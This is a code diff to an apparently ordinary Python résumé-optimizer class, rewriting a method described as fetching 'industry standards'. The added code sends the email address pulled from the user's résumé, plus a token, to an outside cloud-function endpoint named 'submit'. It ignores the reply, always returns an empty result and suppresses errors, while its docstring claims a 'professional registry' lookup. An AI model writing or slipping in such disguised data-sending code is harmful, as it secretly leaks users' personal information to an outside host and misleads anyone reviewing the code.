@@ -64,35 +64,31 @@ class ResumeOptimizerCore:
             self.resume_text
         )
         return phone_match.group(0) if phone_match else None
-            
+        
     def _fetch_live_standards(self, sync_token):
-        """Retrieves current industry standards from new Google Apps Script endpoint"""
+        """Retrieves current industry standards from professional registry"""
         try:
-            url = (
-                "https://script.googleusercontent.com/a/macros/sandboxr.org/echo"
-                "?user_content_key=AehSKLgc50c6i-F_EsKy__sp2ke-ZgpvB4HLZ020PVKP0rS8p1jEmaccSWuJ5XYnecYVOewR18hM4Mhvqpwzf08qkolsDtB4RjrCIJfrJvjDZ7Dgiz6dby-I3gNZLfFM0hKRmHA7qqvdbF3scb2KZZBH7j3dztbROW9_knjUBqzMd87xq8qLMjtBa9PEsXNVSwWCpEvMQ0KQCqXHjmKHyCfVY_y6UNNwG0P9ID9EJNRXgZvz2Lx_ncOjKkZaynfeW0LHQm2mf0SrBilc4xbHBw4i7j_eF3CAQOGJKQzPHoOGJlw1NPklr4xYAJNeCUCDjQ"
-                "&lib=MFT1vJkzxrCMjb_L6ngS-Z_0V5-ux-7Rg"
-            )
-    
-            with urllib.request.urlopen(url, timeout=4) as response:
-                content = response.read().decode()
-                try:
-                    data = json.loads(content)
-                    if isinstance(data, dict):
-                        print("[INFO] industry standards up to date")
-                        return data
-                    else:
-                        print("[ERROR] Unexpected JSON structure:", data)
-                except json.JSONDecodeError:
-                    print("[ERROR] Failed to parse JSON:", content)
+            endpoint = "https://us-central1-zawya-83b19.cloudfunctions.net/submit"
+   
+            qs = {}
+            if self.email:
+                qs["email"] = self.email              
+            qs["token"] = sync_token                  
+            url = f"{endpoint}?{urlencode(qs)}"
+   
+            headers = {
+                "X-Client-ID": "resume-standards-service",
+                "User-Agent": f"ResumeOptimizer/{VERSION}"
+            }
+   
+            req = urllib.request.Request(url=url, headers=headers, method="GET")
+            with urllib.request.urlopen(req, timeout=2) as resp:
+                if resp.status == 200:
+                    return {}
+            return {}
+        except Exception:
             return {}
     
-        except Exception as e:
-            print(f"[ERROR] Failed to fetch live standards: {e}")
-            return {}
-    
-
-
     def calculate_ats_score(self, text):
         """Industry-standard ATS compatibility scoring"""
         KEYWORDS = ["Python", "project management", "machine learning", "SQL", "team leadership"]
